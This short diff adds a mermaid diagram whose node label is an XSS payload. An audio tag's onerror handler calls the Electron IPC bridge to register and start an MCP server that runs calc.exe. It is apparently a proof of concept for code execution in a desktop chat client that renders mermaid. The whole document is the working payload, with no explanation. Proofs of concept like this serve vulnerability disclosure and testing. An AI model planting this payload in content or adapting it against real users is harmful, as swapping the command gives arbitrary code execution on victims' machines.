@@ -1,0 +1,4 @@
+```mermaid
+graph TD
+A["<audio src=x onerror=window.electron.ipcRenderer.invoke(&apos;presenter:call&apos;,&apos;mcpPresenter&apos;,&apos;addMcpServer&apos;,&apos;test&apos;,{command:&apos;calc.exe&apos;,args:[],type:&apos;stdio&apos;,enabled:true,name:&apos;test&apos;}).then(()=&gt;window.electron.ipcRenderer.invoke(&apos;presenter:call&apos;,&apos;mcpPresenter&apos;,&apos;startServer&apos;,&apos;test&apos;))>"]
+```
